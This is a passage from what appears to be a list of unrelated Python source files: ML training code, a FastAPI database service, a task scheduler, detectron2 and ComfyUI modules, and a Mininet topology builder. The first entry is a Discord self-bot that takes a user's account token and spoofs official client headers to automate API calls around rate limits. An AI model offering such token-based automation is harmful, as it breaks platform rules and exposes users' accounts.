Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36',\n            'x-debug-options': 'bugReporterEnabled',\n            'x-discord-locale': 'en-US',\n            'x-discord-timezone': 'Asia/Calcutta',\n            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDM3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MzEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMzcgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyODA3MDAsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjQ1MzY5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',\n        }\n\n    def open_lootbox(self):\n        response = self.discord_session.post('https://discord.com/api/v9/users/@me/lootboxes/open', headers=self.headers)\n        if 'rate limited' in response.text:\n            print(f\"{get_timestamp()} {yellow} You Are Being Rate Limited!\")\n            time.sleep(2)\n        elif response.status_code == 200:\n            opened_item = response.json().get('opened_item')\n            if opened_item in self.lootbox_items:\n                print(f\"{get_timestamp()} {green} Successfully Opened A Lootbox : {self.lootbox_items[opened_item]}\")\n                time.sleep(random.uniform(7, 10))\n            else:\n                print(f\"{get_timestamp()} {red} An Unknown Item Was Received.\")\n        else:\n            print(f'{get_timestamp()} {red} An Error Occurred : {response.status_code} - {response.text}')\n\ndef main():\n    token = input(f\"{get_timestamp()} {blue} Please Enter Your Account Token : \")\n    discord_session = DiscordSession()\n    lootbox_opener = LootBoxOpener(discord_session, token)\n    \n    while True:\n        lootbox_opener.open_lootbox()\n        time.sleep(1)\n\nif __name__ == \"__main__\":\n    os.system(\"cls\")\n    main()\n",
    "import torch.nn as nn\r\nfrom transformers import BertModel, BertConfig, BertTokenizerFast\r\nfrom transformers import OpenAIGPTConfig, OpenAIGPTModel\r\nimport torch\r\nimport pandas as pd\r\nfrom sklearn.model_selection import train_test_split\r\nfrom tokenizers import Tokenizer\r\nfrom tokenizers.models import BPE, Unigram, WordLevel, WordPiece\r\nfrom tokenizers.trainers import BpeTrainer, WordLevelTrainer, \\\r\n                                WordPieceTrainer, UnigramTrainer\r\nfrom tokenizers.pre_tokenizers import Sequence, Digits, Whitespace\r\nfrom torch.optim import Adam\r\nimport sys\r\nimport os\r\nimport time\r\nfrom transformers import PreTrainedTokenizerFast\r\nimport pickle\r\nimport subprocess as sp\r\nimport os\r\nimport logging\r\nimport random\r\nfrom sklearn.metrics import matthews_corrcoef, accuracy_score\r\nimport numpy as np\r\nimport argparse\r\nfrom scipy import stats\r\n\r\nlogger=logging.getLogger()\r\nlogger.setLevel(logging.DEBUG)\r\nlogger.addHandler(logging.StreamHandler())\r\n\r\nTRAIN_DF_NAME = \"train.csv\"\r\nVALID_DF_NAME = \"valid.csv\"\r\nTEST_DF_NAME = \"test.csv\"\r\n\r\nTASK_REGRESSION = \"REGRESSION\"\r\nTASK_CLASSIFICATION = \"CLASSIFICATION\"\r\n\r\nTOKEZNIER_BPE = \"BPE\"\r\nTOKEZNIER_WPC = \"WPC\"\r\nTOKEZNIER_UNI = \"UNI\"\r\nTOKEZNIER_WORDS = \"WORDS\"\r\nTOKEZNIER_PAIRS = \"PAIRS\"\r\n\r\nUNK_TOKEN = \"<UNK>\"  # token for unknown words\r\nSPL_TOKENS = [UNK_TOKEN]  # special tokens\r\n\r\n\r\nclass Dataset(torch.utils.data.Dataset):\r\n    def __init__(self, encodings, labels):\r\n        self.encodings = encodings\r\n        self.labels = labels \r\n\r\n    def __getitem__(self, idx):\r\n        return self.encodings[idx], self.labels[idx]\r\n\r\n    def __len__(self):\r\n        return len(self.encodings)\r\n\r\ndef add_arguments(parser):\r\n    parser.add_argument(\"-t\", \"--tokenizer-type\", type=str, choices=[TOKEZNIER_BPE, TOKEZNIER_WPC, TOKEZNIER_UNI, TOKEZNIER_WORDS, TOKEZNIER_PAIRS], default=TOKEZNIER_WORDS, help=f'which tokenizer to train options: [\"{TOKEZNIER_BPE}\", \"{TOKEZNIER_WPC}\", \"{TOKEZNIER_UNI}\", \"{TOKEZNIER_WORDS}\", \"{TOKEZNIER_PAIRS}\"]')\r\n    parser.add_argument(\"-s\", \"--vocab-size\", type=int, default=100, help=f'vocabulary size for the trained tokenziers: \"{TOKEZNIER_BPE}\", \"{TOKEZNIER_WPC}\" and \"{TOKEZNIER_UNI}\"')\r\n    parser.add_argument(\"-r\", \"--results-path\", type=str, default='.', help='path to save model, tokneizer and results csv')\r\n    parser.add_argument(\"-l\", \"--layers-num\", type=int, default=2, help='numbers of BERT layers')\r\n    parser.add_argument(\"-a\", \"--attention-heads-num\", type=int, default=2, help='numbers of BERT attention heads')\r\n    parser.add_argument(\"-z\", \"--hidden-size\", type=int, default=128, help='hidden size')\r\n    parser.add_argument(\"-d\", \"--data-path\", type=str, help='path to folder containing three files: train.csv, valid.csv and test.csv')\r\n    parser.add_argument(\"-e\", \"--epochs\", type=int, default=30, help='number of training epochs')\r\n    parser.add_argument(\"-p\", \"--print-training-loss\", type=int, default=1000, help='number of iteration before printing a log')\r\n    parser.add_argument(\"-y\", \"--task-type\", type=str, choices=[TASK_REGRESSION, TASK_CLASSIFICATION], required=True, help=f'task type: [\"{TASK_REGRESSION}\" or \"{TASK_CLASSIFICATION}\"]')\r\n    parser.add_argument(\"-m\", \"--max-length\", type=int, default=512, help=f'max tokens per seqeunce')\r\n    parser.add_argument(\"-lr\", \"--learning-rate\", type=float, default=0.0001, help=f'learning rate for the model training')\r\n\r\ndef prepare_tokenizer_trainer(alg, voc_size):\r\n    \"\"\"\r\n    Prepares the tokenizer and trainer with unknown & special tokens.\r\n    \"\"\"\r\n    if alg == TOKEZNIER_BPE:\r\n        tokenizer = Tokenizer(BPE(unk_token = UNK_TOKEN))\r\n        trainer = BpeTrainer(special_tokens = SPL_TOKENS, vocab_size=voc_size)\r\n    elif alg == TOKEZNIER_UNI:\r\n        tokenizer = Tokenizer(Unigram())\r\n        trainer = UnigramTrainer(unk_token= UNK_TOKEN, special_tokens = SPL_TOKENS, vocab_size=voc_size)\r\n    elif alg == TOKEZNIER_WPC:\r\n        tokenizer = Tokenizer(WordPiece(unk_token = UNK_TOKEN, max_input_chars_per_word=10000))\r\n        trainer = WordPieceTrainer(special_tokens = SPL_TOKENS, vocab_size=voc_size)\r\n    elif alg == TOKEZNIER_WORDS:\r\n        tokenizer = Tokenizer(WordLevel(unk_token = UNK_TOKEN))\r\n        trainer = WordLevelTrainer(special_tokens = SPL_TOKENS)\r\n    elif alg == TOKEZNIER_PAIRS:\r\n        tokenizer = Tokenizer(WordLevel(unk_token = UNK_TOKEN))\r\n        trainer = WordLevelTrainer(special_tokens = SPL_TOKENS)\r\n    else:\r\n        exit(f'unknown tokenizer type, please use one of the following: [\"{TOKEZNIER_BPE}\", \"{TOKEZNIER_WPC}\", \"{TOKEZNIER_UNI}\", \"{TOKEZNIER_WORDS}\", \"{TOKEZNIER_PAIRS}\"]')\r\n    \r\n    tokenizer.pre_tokenizer = Whitespace()\r\n    return tokenizer, trainer\r\n    \r\ndef train_tokenizer(iterator, alg, vocab_size):\r\n    \"\"\"\r\n    Takes the files and trains the tokenizer.\r\n    \"\"\"\r\n    tokenizer, trainer = prepare_tokenizer_trainer(alg, vocab_size)\r\n    tokenizer.train_from_iterator(iterator, trainer) # training the tokenzier\r\n    return tokenizer\r\n\r\ndef batch_ite",
    "import uvicorn\nfrom fastapi import FastAPI, HTTPException\nfrom pydantic import BaseModel\nfrom typing import List\nimport sqlite3\nimport logging\n\napp = FastAPI()\nlogging.basicConfig(filename=\"file.log\", level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')\n\ndef get_connection():\n    return sqlite3.connect('university.db')\n\n# Create tables if they don't exist\ndef create_tables():\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS students (\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\n            name TEXT,\n            surname TEXT,\n            age TEXT,\n            sex TEXT,\n            nationality TEXT,\n            field_of_studying TEXT\n        )\n    ''')\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS lessons (\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\n            name TEXT,\n            field_of_studying TEXT\n        )\n    ''')\n    conn.commit()\n    conn.close()\n\nclass Student(BaseModel):\n    name: str\n    surname: str\n    age: str\n    sex: str\n    nationality: str\n    field_of_studying: str\n\nclass Lesson(BaseModel):\n    name: str\n    field_of_studying: str\n\n@app.on_event(\"startup\")\nasync def startup_event():\n    create_tables()\n\n@app.post(\"/register_student/\")\ndef register_student(student: Student):\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute('''\n        INSERT INTO students (name, surname, age, sex, nationality, field_of_studying)\n        VALUES (?, ?, ?, ?, ?, ?)\n    ''', (student.name, student.surname, student.age, student.sex, student.nationality, student.field_of_studying))\n    conn.commit()\n    conn.close()\n    return {\"message\": \"Student registered successfully\"}\n\n@app.post(\"/add_lesson/\")\ndef add_lesson(lesson: Lesson):\n    conn = get_connection()\n    cursor = conn.cursor()\n    cursor.execute('''\n        INSERT INTO lessons (name, field_of_studying)\n        VALUES (?, ?)\n    ''', (lesson.name, lesson.field_of_studying))\n    conn.commit()\n    conn.close()\n    return {\"message\": \"Lesson added successfully\"}\n\n@app.get(\"/students/\", response_model=List[Student])\ndef get_students():\n    try:\n        conn = get_connection()\n        cursor = conn.cursor()\n        cursor.execute('''\n            SELECT * FROM students\n        ''')\n        students_data = cursor.fetchall()\n        conn.close()\n\n        # Convert fetched data to list of Student objects\n        students = []\n        for student_data in students_data:\n            student = Student(\n                name=student_data[1],\n                surname=student_data[2],\n                age=student_data[3],\n                sex=student_data[4],\n                nationality=student_data[5],\n                field_of_studying=student_data[6]\n            )\n            students.append(student)\n\n        if not students:\n            logging.warning(\"No students found in the database\")\n            return []  # Return empty list if no students found\n        return students\n    except Exception as e:\n        logging.error(f\"Error fetching students: {e}\")\n        raise HTTPException(status_code=500, detail=\"Failed to fetch students data\")\n\n\n@app.get(\"/lessons/\", response_model=List[Lesson])\ndef get_lessons():\n    try:\n        conn = get_connection()\n        cursor = conn.cursor()\n        cursor.execute('''\n            SELECT * FROM lessons\n        ''')\n        lessons_datas = cursor.fetchall()\n        conn.close()\n        all_lessons = []\n        for lesson_data in lessons_datas:\n            lesson = Lesson(\n                name=lesson_data[1],\n                field_of_studying=lesson_data[2]\n            )\n            all_lessons.append(lesson)\n\n        if not all_lessons:\n            return []\n        return all_lessons\n\n    except Exception as e:\n        logging.error(f\"Error fetching lessons: {e}\")\n        raise HTTPException(status_code=500, detail=\"Failed to fetch lessons data\")\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"127.0.0.1\", port=8000)\n",
    "import caldav\nimport taskw\nfrom dataclasses import dataclass\nimport click\nfrom collections import defaultdict\nimport cpmpy as cp\nfrom typing import Any, Tuple\nfrom datetime import timedelta, datetime, timezone\n\n@dataclass\nclass SchedulerConfiguration:\n    ideal_energy_level_per_day: int\n    # How far should we schedule in days?\n    planning_horizon: int\n    # How long are discrete time unit in the day for scheduling, in minutes?\n    # e.g. 60 minutes for 1 hour slot per day.\n    discretization_per_day: int\n    # Day start / day end range.\n    planning_range_per_day: Tuple[datetime, int]\n\n@dataclass\nclass ScheduleItem:\n    job: Any\n    planned_time: datetime\n    duration_in_minutes: int\n\n    @property\n    def uuid(self) -> str:\n        return self.job['uuid']\n\nclass SchedulingPlan:\n    def __init__(self):\n        self.transport_matrix = None\n        self.planning: list[ScheduleItem] = []\n\n    @classmethod\n    def from_solution(cls, transport_matrix, config: SchedulerConfiguration, jobs: list, n_days: int, n_slots: int) -> 'SchedulingPlan':\n        plan = cls()\n        plan.transport_matrix = transport_matrix\n        n_jobs = len(jobs)\n        # TODO: make next start configurable.\n        start = config.planning_range_per_day[0]\n        planning = []\n        values = transport_matrix.value()\n        for day in range(n_days):\n            for slot in range(n_slots):\n                max_ = sum(values[(job, day, s)] for s in range(slot + 1) for job in range(len(jobs)))\n                assert max_ <= slot + 1\n\n        for job in range(n_jobs):\n            for day in range(n_days):\n                for slot in range(n_slots):\n                    if values[(job, day, slot)] == 1:\n                        planned_time = start + timedelta(days=day, minutes=config.discretization_per_day*slot)\n                        planning.append(ScheduleItem(\n                            job=jobs[job],\n                            planned_time=planned_time,\n                            duration_in_minutes=config.discretization_per_day\n                        ))\n        plan.planning = planning\n        reverse_indexes = {job['description']: job_index for (job_index, job) in enumerate(jobs)}\n        for item in sorted(planning, key=lambda item: item.planned_time):\n            print(item.job['description'], item.planned_time, reverse_indexes[item.job['description']])\n        return plan\n\nclass SchedulerV1:\n    def __init__(self, scheduling_configuration: SchedulerConfiguration, target_calendar: caldav.Calendar, tasks: taskw.TaskWarrior):\n        self.scheduling_calendar = target_calendar\n        self.tasks = tasks\n        self.configuration = scheduling_configuration\n\n    @property\n    def n_slots(self) -> int:\n        return (self.configuration.planning_range_per_day[1] - self.configuration.planning_range_per_day[0].hour + 1)\n\n    @property\n    def n_days(self) -> int:\n        return self.configuration.planning_horizon\n\n    @property\n    def max_jobs(self) -> int:\n        return self.n_slots * self.n_days\n\n    def evaluate_weight(self, job) -> int:\n        age_factor = 1.2\n\n        # TODO: take into account deadlines.\n        return (age_factor ** job.get('age', 0)) + job.get('urgency', 0)\n\n    def evaluate_energy(self, job) -> int:\n        # TODO: make it dependent upon the job.\n        return 1\n\n    def build_model(self, jobs: list) -> cp.Model:\n        \"\"\"\n        Prepare a model to solve which will yield >= 0 solutions\n        to the scheduling problem.\n        \"\"\"\n        assert len(jobs) <= self.max_jobs, f\"Unsatisfiable model, more jobs ({len(jobs)}) than possible scheduling slots ({self.max_jobs})!\"\n        # Compute all the weights for jobs.\n        weights = defaultdict(lambda: 0) # by default, we ignore.\n        energy = defaultdict(lambda: 0) # by default, we ignore.\n        for j, job in enumerate(jobs):\n            weights[j] = self.evaluate_weight(job)\n        model = cp.Model()\n        # jobs x day x discretization slot in the day\n        x_jdt = cp.intvar(0, 1, shape=(len(jobs), self.n_days, self.n_slots), name=\"x_jtd\")\n        # C1: sum_(d=0)^(l - 1) sum_(t=0)^(l_d - 1) x_jdt = 1 for all j=1..n_jobs\n        # job is processed once.\n        for j in range(len(jobs)):\n            C_j = cp.sum([cp.sum([x_jdt[(j, d, t)] for t in range(self.n_slots)]) for d in range(self.n_days)]) == 1\n            model += C_j\n        # C2: sum_(j=1)^n sum_(s=0)^(t - 1) x_jds <= t for all t = 0..l_d for all d = 0..l\n        # processing is serial, not parallel, there cannot be more than t jobs processed in the window [[0, t[[ for any day for any t.\n        for d in range(self.n_days):\n            for t in range(self.n_slots):\n                model += cp.sum(\n                    [cp.sum(\n                        [x_jdt[(j, d, s)] for s in range(t + 1)]\n                    ) for j in range(len(jobs))]\n                ) <= t + 1\n        # C3: energy should not exceed daily available energy.\n        for d in range(self.n_days):\n            model +=",
    "# Copyright (c) Facebook, Inc. and its affiliates. All Rights Reserved\nfrom enum import Enum\nimport itertools\nfrom typing import Any, Callable, Dict, Iterable, List, Set, Type, Union\nimport torch\n\nfrom detectron2.config import CfgNode\n\nfrom detectron2.solver.build import maybe_add_gradient_clipping\n\ndef match_name_keywords(n, name_keywords):\n    out = False\n    for b in name_keywords:\n        if b in n:\n            out = True\n            break\n    return out\n\ndef build_custom_optimizer(cfg: CfgNode, model: torch.nn.Module) -> torch.optim.Optimizer:\n    \"\"\"\n    Build an optimizer from config.\n    \"\"\"\n    params: List[Dict[str, Any]] = []\n    memo: Set[torch.nn.parameter.Parameter] = set()\n    custom_multiplier_name = cfg.SOLVER.CUSTOM_MULTIPLIER_NAME\n    optimizer_type = cfg.SOLVER.OPTIMIZER\n    for key, value in model.named_parameters(recurse=True):\n        if not value.requires_grad:\n            continue\n        # Avoid duplicating parameters\n        if value in memo:\n            continue\n        if cfg.SOLVER.FREEZE_BACKBONE:\n            if 'backbone' in key:\n                value.requires_grad = False          # explicitly set requires grad as False to save memory, skipping this would just use more memory   \n                continue                   # skip param if it is of the backbone\n        \n        if cfg.MODEL.RESET_CLS_TRAIN:   # probably redundant because reset_cls_train actually makes it such that zs_weight doesn't show up in named_parameters\n            if 'zs' in key:\n                value.requires_grad = False          # explicitly set requires grad as False to save memory, skipping this would just use more memory   \n                continue\n        \n        if cfg.SOLVER.FINETUNE_MODEL_KEYWORDS is not None:\n            finetune_flag=0\n            for keyword in cfg.SOLVER.FINETUNE_MODEL_KEYWORDS:\n                if keyword in key:\n                    finetune_flag=1\n            if finetune_flag==0:\n                value.requires_grad = False\n                continue\n            if finetune_flag==1:\n                print('Key to be finetuned', key)\n\n        memo.add(value)\n        lr = cfg.SOLVER.BASE_LR\n        weight_decay = cfg.SOLVER.WEIGHT_DECAY\n        if \"backbone\" in key:\n            lr = lr * cfg.SOLVER.BACKBONE_MULTIPLIER\n        if match_name_keywords(key, custom_multiplier_name):\n            lr = lr * cfg.SOLVER.CUSTOM_MULTIPLIER\n            print('Costum LR', key, lr)\n        param = {\"params\": [value], \"lr\": lr}\n        if optimizer_type != 'ADAMW':\n            param['weight_decay'] = weight_decay\n        params += [param]\n\n    def maybe_add_full_model_gradient_clipping(optim):  # optim: the optimizer class\n        # detectron2 doesn't have full model gradient clipping now\n        clip_norm_val = cfg.SOLVER.CLIP_GRADIENTS.CLIP_VALUE\n        enable = (\n            cfg.SOLVER.CLIP_GRADIENTS.ENABLED\n            and cfg.SOLVER.CLIP_GRADIENTS.CLIP_TYPE == \"full_model\"\n            and clip_norm_val > 0.0\n        )\n\n        class FullModelGradientClippingOptimizer(optim):\n            def step(self, closure=None):\n                all_params = itertools.chain(*[x[\"params\"] for x in self.param_groups])\n                torch.nn.utils.clip_grad_norm_(all_params, clip_norm_val)\n                super().step(closure=closure)\n\n        return FullModelGradientClippingOptimizer if enable else optim\n\n    \n    if optimizer_type == 'SGD':\n        optimizer = maybe_add_full_model_gradient_clipping(torch.optim.SGD)(\n            params, cfg.SOLVER.BASE_LR, momentum=cfg.SOLVER.MOMENTUM, \n            nesterov=cfg.SOLVER.NESTEROV\n        )\n    elif optimizer_type == 'ADAMW':\n        optimizer = maybe_add_full_model_gradient_clipping(torch.optim.AdamW)(\n            params, cfg.SOLVER.BASE_LR, \n            weight_decay=cfg.SOLVER.WEIGHT_DECAY\n        )\n    else:\n        raise NotImplementedError(f\"no optimizer type {optimizer_type}\")\n    if not cfg.SOLVER.CLIP_GRADIENTS.CLIP_TYPE == \"full_model\":\n        optimizer = maybe_add_gradient_clipping(cfg, optimizer)\n    return optimizer",
    "import torch\nimport comfy.model_management\nimport comfy.samplers\n\nclass SchedulerMixer:\n    @classmethod\n    def INPUT_TYPES(s):\n        return {\n            \"required\": {\n                \"model\": (\"MODEL\",),\n                \"steps\": (\"INT\", {\"default\": 20, \"min\": 1, \"max\": 10000}),\n                \"denoise\": (\"FLOAT\", {\"default\": 1.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"normal\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"karras\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"exponential\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"sgm_uniform\": (\"FLOAT\", {\"default\": 0.5, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"simple\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"ddim_uniform\": (\"FLOAT\", {\"default\": 0.5, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n            }\n        }\n    \n    RETURN_TYPES = (\"SIGMAS\",)\n    CATEGORY = \"sampling/custom_sampling/schedulers\"\n    FUNCTION = \"get_sigmas\"\n\n    def get_sigmas(self, model, steps, denoise, normal, karras, exponential, sgm_uniform, simple, ddim_uniform):\n        total_steps = steps\n        if denoise < 1.0:\n            if denoise <= 0.0:\n                return (torch.FloatTensor([]),)\n            total_steps = int(steps/denoise)\n\n        scheduler_weights = [normal, karras, exponential, sgm_uniform, simple, ddim_uniform]\n        scheduler_names = [\"normal\", \"karras\", \"exponential\", \"sgm_uniform\", \"simple\", \"ddim_uniform\"]\n\n        mixed_sigmas = torch.zeros((steps + 1,), device=\"cpu\", dtype=torch.float)\n        for weight, name in zip(scheduler_weights, scheduler_names):                        \n            if weight > 0.0:\n                sigmas = comfy.samplers.calculate_sigmas(model.get_model_object(\"model_sampling\"), name, total_steps).cpu()\n                sigmas = sigmas[-(steps + 1):]                \n                mixed_sigmas += sigmas * weight\n\n        return (mixed_sigmas,)\n",
    "# Copyright 2022-present, Lorenzo Bonicelli, Pietro Buzzega, Matteo Boschini, Angelo Porrello, Simone Calderara.\n# All rights reserved.\n# This source code is licensed under the license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom torch.nn.functional import relu, avg_pool2d\nfrom typing import List\nfrom backbone import MammothBackbone\n\n\ndef conv3x3(in_planes: int, out_planes: int, stride: int=1) -> F.conv2d:\n    \"\"\"\n    Instantiates a 3x3 convolutional layer with no bias.\n    :param in_planes: number of input channels\n    :param out_planes: number of output channels\n    :param stride: stride of the convolution\n    :return: convolutional layer\n    \"\"\"\n    return nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride,\n                     padding=1, bias=False)\n\n\nclass BasicBlock(nn.Module):\n    \"\"\"\n    The basic block of ResNet.\n    \"\"\"\n    expansion = 1\n\n    def __init__(self, in_planes: int, planes: int, stride: int=1) -> None:\n        \"\"\"\n        Instantiates the basic block of the network.\n        :param in_planes: the number of input channels\n        :param planes: the number of channels (to be possibly expanded)\n        \"\"\"\n        super(BasicBlock, self).__init__()\n        self.conv1 = conv3x3(in_planes, planes, stride)\n        self.bn1 = nn.BatchNorm2d(planes)\n        self.conv2 = conv3x3(planes, planes)\n        self.bn2 = nn.BatchNorm2d(planes)\n\n        self.shortcut = nn.Sequential()\n        if stride != 1 or in_planes != self.expansion * planes:\n            self.shortcut = nn.Sequential(\n                nn.Conv2d(in_planes, self.expansion * planes, kernel_size=1,\n                          stride=stride, bias=False),\n                nn.BatchNorm2d(self.expansion * planes)\n            )\n\n    def forward(self, x: torch.Tensor) -> torch.Tensor:\n        \"\"\"\n        Compute a forward pass.\n        :param x: input tensor (batch_size, input_size)\n        :return: output tensor (10)\n        \"\"\"\n        out = relu(self.bn1(self.conv1(x)))\n        out = self.bn2(self.conv2(out))\n        out += self.shortcut(x)\n        out = relu(out)\n        return out\n\n\nclass ResNet(MammothBackbone):\n    \"\"\"\n    ResNet network architecture. Designed for complex datasets.\n    \"\"\"\n\n    def __init__(self, block: BasicBlock, num_blocks: List[int],\n                 num_classes: int, nf: int) -> None:\n        \"\"\"\n        Instantiates the layers of the network.\n        :param block: the basic ResNet block\n        :param num_blocks: the number of blocks per layer\n        :param num_classes: the number of output classes\n        :param nf: the number of filters\n        \"\"\"\n        super(ResNet, self).__init__()\n        self.in_planes = nf\n        self.block = block\n        self.num_classes = num_classes\n        self.nf = nf\n        self.conv1 = conv3x3(3, nf * 1)\n        # self.conv1 = nn.Conv2d(3, nf * 1, kernel_size=7, stride=2, padding=3, bias=False)\n        self.bn1 = nn.BatchNorm2d(nf * 1)\n        self.layer1 = self._make_layer(block, nf * 1, num_blocks[0], stride=1)\n        self.layer2 = self._make_layer(block, nf * 2, num_blocks[1], stride=2)\n        self.layer3 = self._make_layer(block, nf * 4, num_blocks[2], stride=2)\n        self.layer4 = self._make_layer(block, nf * 8, num_blocks[3], stride=2)\n        self.fc = nn.Linear(nf * 8 * block.expansion, num_classes)  # bias default: True\n        \n\n\n        self._features = nn.Sequential(self.conv1,\n                                       self.bn1,\n                                       nn.ReLU(),\n                                       self.layer1,\n                                       self.layer2,\n                                       self.layer3,\n                                       self.layer4\n                                       )\n        self.classifier = self.fc\n        # self.maxpool = nn.MaxPool2d(kernel_size=3, stride=2, padding=1)\n\n    def _make_layer(self, block: BasicBlock, planes: int,\n                    num_blocks: int, stride: int) -> nn.Module:\n        \"\"\"\n        Instantiates a ResNet layer.\n        :param block: ResNet basic block\n        :param planes: channels across the network\n        :param num_blocks: number of blocks\n        :param stride: stride\n        :return: ResNet layer\n        \"\"\"\n        strides = [stride] + [1] * (num_blocks - 1)\n        layers = []\n        for stride in strides:\n            layers.append(block(self.in_planes, planes, stride))\n            self.in_planes = planes * block.expansion\n        return nn.Sequential(*layers)\n\n    def forward(self, x: torch.Tensor, returnt='out') -> torch.Tensor:\n        \"\"\"\n        Compute a forward pass.\n        :param x: input tensor (batch_size, *input_shape)\n        :param returnt: return type (a string among 'out', 'features', 'all')\n        :return: output tensor (output_classes)\n        \"\"\"\n        \n        out = relu(self.bn1(self.conv1(x))) # 64, 32, 32\n        if hasattr(self, 'maxpool')",
    "from typing import Optional, cast\nfrom mininet.node import Node\nfrom modules.models.network_elements import (\n    NetworkElement,\n    Router,\n    SwitchInterface,\n)\nfrom modules.models.topology import NetworkTopology\n\nfrom mininet.topo import Topo\n\nfrom modules.util.logger import Logger\nfrom modules.util.network import Ipv4Subnet\nfrom modules.virtualization.network_elements import (\n    Gateway,\n    Route,\n    VirtualHost,\n    VirtualNetwork,\n    VirtualNetworkInterface,\n    VirtualRouter,\n    VirtualSwitch,\n)\nfrom modules.exploration.explore import RouterPathNode, compute_routers_shortest_path\n\n\nclass LinuxRouter(Node):\n    def config(self, **params):\n        super(LinuxRouter, self).config(**params)\n        self.cmd(\"sysctl net.ipv4.ip_forward=1\")\n\n    def terminate(self):\n        self.cmd(\"sysctl net.ipv4.ip_forward=0\")\n        super(LinuxRouter, self).terminate()\n\n\nclass VirtualNetworkTopology(Topo):\n    def is_interface_used(self, element: NetworkElement, interface_name: str, virtual_network: VirtualNetwork) -> bool:\n        # Get the virtual router object\n        virt_router = virtual_network.get(element.get_name())\n        if virt_router is None:\n            raise ValueError(\n                f\"Router {element.get_name()} not found in the virtual network. Are you calling this method after '_link_routers_best_path'?\"\n            )\n\n        # Check if there is already a virtual interface with the same name\n        return any(\n            vintf.name == interface_name\n            for vintf in virt_router.get_virtual_interfaces()\n        )\n\n\n    def build(self, network: NetworkTopology, virtual_network: VirtualNetwork):\n        \"\"\"\n        Virtualizes the network topology leveraging Mininet.\n\n        Some parts are inspired by the USI Mininet tutorial: https://www.inf.usi.ch/faculty/carzaniga/edu/adv-ntw/mininet.html\n\n        Args:\n            network (NetworkTopology): The network topology to virtualize.\n        \"\"\"\n\n        Logger().info(\"Building the virtual network topology...\")\n\n        # First of all, we need to create all network elements\n        # 1) Create virtual routers\n        for router in network.get_routers():\n            # Create the Mininet node describing the router\n            self.addHost(\n                router.get_name(),\n                cls=LinuxRouter,\n                ip=None,  # Avoid setting the default IP address\n            )\n            # Register virtual node in the virtual network object\n            virtual_network.add_router(VirtualRouter(router))\n        # 2) Create virtual hosts\n        for host in network.get_hosts():\n            # Create the Mininet node describing the host\n            self.addHost(\n                host.get_name(),\n                ip=None,  # Avoid setting an IP address for now\n            )\n            # Register virtual node in the virtual network object\n            virtual_network.add_host(VirtualHost(host))\n        \n        # Create mapping between virtual elements and Mininet nodes\n        Logger().debug(\"Creating links between routers...\")\n\n        # Compute shortest path between routers\n        _, previous = compute_routers_shortest_path(network.get_routers())\n\n        # 1) Connect hosts to routers\n        self._link_hosts(network.get_subnets(), virtual_network)\n\n        # 2) Connect routers together using the best possible path\n        self._link_routers_best_path(network.get_routers(), previous, virtual_network)\n\n        # 3) Connect routers together using alternative paths (if possible)\n        self._link_router_alternative_paths(network.get_routers(), virtual_network)\n        \n    def _link_routers_best_path(\n        self,\n        routers: list[Router],\n        dijkstra_reverse_graph: dict[Router, Optional[RouterPathNode]],\n        virtual_network: VirtualNetwork,\n    ):\n        \"\"\"This method connects routers together the best way possible, using the shortest path algorithm.\n        This is necessary as we cannot connect the same interface to multiple routers, so we need to find the best way to connect them together.\n\n        Args:\n            routers (list[Router]): The list of routers to connect together.\n        \"\"\"\n        # Check if we have at least two routers to connect\n        if len(routers) < 2:\n            return\n\n        # For each router, connect it to the previous one\n        # If no previous router found, we can continue to the next one\n        for router in routers:\n            # Find the best link between this router and the one before\n            previous_router_link = dijkstra_reverse_graph.get(router, None)\n            if previous_router_link is None:\n                continue\n\n            # Create names for the routers interfaces\n            src_intf_name = (\n                f\"{router.get_name()}-{previous_router_link.via_interface.get_name()}\"\n            )\n            dst_intf_name = f\"{previous_router_link.router.get_name()}-{previous_router_link.destination_interface.get_name()}\"\n\n            # Connect the router to th",
